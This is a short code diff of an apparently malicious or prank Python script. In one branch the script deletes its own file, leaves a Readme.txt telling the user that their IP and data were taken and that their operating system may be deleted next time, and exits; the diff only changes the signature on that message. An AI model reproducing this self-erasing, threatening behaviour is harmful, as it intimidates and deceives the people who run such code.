@@ -33,7 +33,7 @@ else:
     os.remove(script_path)
     # Create a Readme file with a warning message
     with open('Readme.txt', 'w') as readme_file:
-        readme_file.write("I got your IP and data. I deleted my app. Next time maybe I will delete your OS hehe. مع تحياتي غلوش |@Mrfa0gh")
+        readme_file.write("I got your IP and data. I deleted my app. Next time maybe I will delete your OS hehe. Ghalwash Was here |@Mrfa0gh")
     sys.exit()
 
 url = input("Please enter the URL: ")
